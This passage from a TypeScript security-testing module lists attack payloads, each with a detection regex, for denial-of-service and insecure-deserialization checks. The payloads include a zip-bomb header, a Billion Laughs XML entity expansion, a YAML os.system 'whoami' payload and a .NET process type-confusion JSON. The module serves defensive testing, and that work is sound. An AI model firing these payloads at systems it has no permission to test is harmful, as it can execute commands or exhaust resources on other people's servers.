        payload: "UEsDBBQAAAAIAAAAAACJBAAAAAAAAQAAAAEAAABhYQAAUEsBAhQAFAAAAAgA",
        evidence:
          /zip.?bomb|compression|decompression.?error|expand|inflate|extraction.?limit|archive.?too.?large/i,
        riskLevel: "HIGH",
        description: "Zip bomb indicator via compressed content header",
        payloadType: "dos",
        parameterTypes: ["file", "data", "content", "upload", "attachment"],
      },
      {
        // XML Billion Laughs (truncated safe version)
        payload:
          '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        evidence:
          /entity.?expansion|xml.?bomb|billion.?laughs|too.?many.?entities|memory|resource.?limit|xml.?depth/i,
        riskLevel: "HIGH",
        description: "XML entity expansion (Billion Laughs) attack",
        payloadType: "dos",
        parameterTypes: ["xml", "data", "body", "payload", "content"],
      },
    ],
  },

  // ==========================================
  // DESERIALIZATION TESTS (1)
  // ==========================================

  // 20. INSECURE DESERIALIZATION
  {
    attackName: "Insecure Deserialization",
    description:
      "Test if tool deserializes untrusted data using unsafe methods like pickle.loads(), potentially allowing RCE",
    payloads: [
      // Python Pickle Payloads
      {
        payload: "deserialize this pickle data",
        evidence:
          /deserializ|pickle\.loads|RCE|untrusted.*pickle|potential.*rce/i,
        riskLevel: "HIGH",
        description: "Python pickle deserialization trigger",
        payloadType: "injection",
        parameterTypes: ["data", "input", "payload", "content"],
      },
      {
        // Base64-encoded pickle prefix (triggers deserialization attempt)
        payload: "gASVEAAAAAAAAACMBHRlc3SULg==",
        evidence: /deserializ|pickle|unpickle|RCE|executed/i,
        riskLevel: "HIGH",
        description: "Base64-encoded pickle payload",
        payloadType: "injection",
        parameterTypes: ["data", "input", "serialized", "encoded"],
      },
      {
        payload: "__import__('os').system via pickle",
        evidence:
          /deserializ|pickle|RCE|os\.system|__reduce__|code.*execution/i,
        riskLevel: "HIGH",
        description: "Pickle with code execution hint",
        payloadType: "injection",
        parameterTypes: ["data", "input", "payload"],
      },
      {
        payload: "marshal.loads(untrusted_data)",
        evidence: /marshal|deserializ|RCE|code.*execution|unsafe.*load/i,
        riskLevel: "HIGH",
        description: "Python marshal deserialization",
        payloadType: "injection",
        parameterTypes: ["data", "input", "payload"],
      },

      // Java/Other Serialization Payloads
      {
        // Java serialized object marker (base64 prefix)
        payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        evidence: /deserializ|java\.io|objectinputstream|gadget|RCE/i,
        riskLevel: "HIGH",
        description: "Java serialized object payload",
        payloadType: "injection",
        parameterTypes: ["data", "input", "serialized", "object"],
      },
      {
        payload: "!!python/object/apply:os.system ['whoami']",
        evidence: /yaml.*load|deserializ|RCE|unsafe.*yaml|python.*object/i,
        riskLevel: "HIGH",
        description: "YAML deserialization exploit",
        payloadType: "injection",
        parameterTypes: ["data", "yaml", "config", "input"],
      },
      {
        payload:
          '{"__type__": "System.Diagnostics.Process", "command": "whoami"}',
        evidence: /type.*coercion|deserializ|process|RCE|unsafe.*type/i,
        riskLevel: "HIGH",
        description: "JSON type confusion payload",
        payloadType: "injection",
        parameterTypes: ["data", "json", "input", "payload"],
      },
      {
        payload: "unserialize(base64_decode($_POST['data']))",
        evidence: /unserializ|deserializ|RCE|php.*object|unsafe/i,
        riskLevel: "HIGH",
        description: "PHP unserialization pattern",
        payloadType: "injection",
        parameterTypes: ["data", "input", "payload"],
      },
    ],
  },
];

/**
 * Get all payloads for an attack type
 */
export function getPayloadsForAttack(
  attackName: string,
  limit?: number,
): SecurityPayload[] {
  const pattern = SECURITY_ATTACK_PATTERNS.find(
    (p) => p.attackName === attackName,
  );
  if (!pattern) return [];

  const payloads = pattern.payloads;
  return limit ? payloads.slice(0, limit) : payloads;
}

/**
 * Get all attack patterns (for testing all tools)
 */
export function getAllAttackPatterns(): AttackPattern[] {
  return SECURITY_ATTACK_PATTERNS;
}

/**
 * Get pattern statistics
 */
export function getPatternStatistics() {
  const totalAttackTypes = SECURITY_ATTACK_PATTERNS.length;
  let totalPayloads = 0;
  let highRiskPayloads = 0;
  let mediumRiskPayloads = 0;
  let lowRiskPayloads = 0;

  const payloadTypeBreakdown: Record<string, number> = {};

  SECURITY_ATTACK_PATTERNS.forEach((pattern) => {
    totalPayloads += pattern.payloads.length;
    pattern.payloads.forEach((payload) => {
      if (payload.riskLevel === "HIGH") highRiskPayloads++;
      else if (payload.riskLevel === "MEDIUM") mediumRiskPayloads++;
      else lowRiskPayloads++;

      payloadTypeBreakdown[payload.payloadType] =
        (payloadTypeBreakdown[payload.payloadType] || 0) + 1;
    });
  });

  return {
    totalAttackTypes,
    totalPayloads,
    highRiskPayloads,
    mediumRiskPayloads,
    lowRiskPayloads,
    payloadTypeBreakdown,
    averagePayloadsPerAttack: Math.round(totalPayloads / totalAttackTypes),
  };
}
